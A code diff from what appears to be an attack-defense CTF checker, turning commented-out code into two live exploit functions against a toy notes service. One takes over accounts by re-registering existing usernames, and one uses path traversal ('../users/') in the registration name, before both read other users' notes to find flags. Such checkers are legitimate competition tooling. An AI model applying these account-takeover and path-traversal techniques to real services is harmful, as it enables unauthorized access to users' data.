@@ -351,22 +351,22 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     await conn.writer.drain()
 
     # TODO: Use flag hints
-    # TODO: OLD CODE
-    # user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    # for user in user_list:
-    #     user_name = user.split()[-1]
-    #     conn.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
-    #     conn.read_until(b">")  # successfully registered
-    #     conn.read_until(b">")  # successfully logged in
-    #     notes_list = conn.read_until(b">").split(b"\n")[:-1]
-    #     for note in notes_list:
-    #         note_id = note.split()[-1]
-    #         conn.write(b"get %s\n" % note_id)
-    #         data = conn.read_until(b">")
-    #         if flag := self.search_flag_bytes(data):
-    #             return flag
-    # raise BrokenServiceException("flag not found")
-    # END TODO: OLD CODE
+    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
+    for user in user_list:
+        user_name = user.split()[-1]
+        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
+        await conn.writer.drain()
+        await conn.reader.readuntil(b">")  # successfully registered
+        await conn.reader.readuntil(b">")  # successfully logged in
+        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
+        for note in notes_list:
+            note_id = note.split()[-1]
+            conn.writer.write(b"get %s\n" % note_id)
+            await conn.writer.drain()
+            data = await conn.reader.readuntil(b">")
+            if flag := searcher.search_flag(data):
+                return flag
+    raise MumbleException("flag not found")
 
 @checker.exploit(2)
 async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: AsyncSocket, logger:LoggerAdapter) -> Optional[str]:
@@ -374,22 +374,23 @@ async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     conn.writer.write(b"user\n")
     await conn.writer.drain()
 
-    # TODO: OLD CODE
-    # user_list = conn.read_until(b">").split(b"\n")[:-1]
-    # for user in user_list:
-    #     user_name = user.split()[-1]
-    #     conn.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
-    #     conn.read_until(b">")  # successfully registered
-    #     conn.read_until(b">")  # successfully logged in
-    #     notes_list = conn.read_until(b">").split(b"\n")[:-1]
-    #     for note in notes_list:
-    #         note_id = note.split()[-1]
-    #         conn.write(b"get %s\n" % note_id)
-    #         data = conn.read_until(b">")
-    #         if flag := self.search_flag_bytes(data):
-    #             return flag
-    # raise BrokenServiceException("flag not found")
-    # END TODO: OLD CODE
+    # TODO: Use flag hints?
+    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
+    for user in user_list:
+        user_name = user.split()[-1]
+        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
+        await conn.writer.drain()
+        await conn.reader.readuntil(b">")  # successfully registered
+        await conn.reader.readuntil(b">")  # successfully logged in
+        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
+        for note in notes_list:
+            note_id = note.split()[-1]
+            conn.writer.write(b"get %s\n" % note_id)
+            await conn.writer.drain()
+            data = await conn.reader.readuntil(b">")
+            if flag := searcher.search_flag(data):
+                return flag
+    raise MumbleException("flag not found")
 
 
 if __name__ == "__main__":
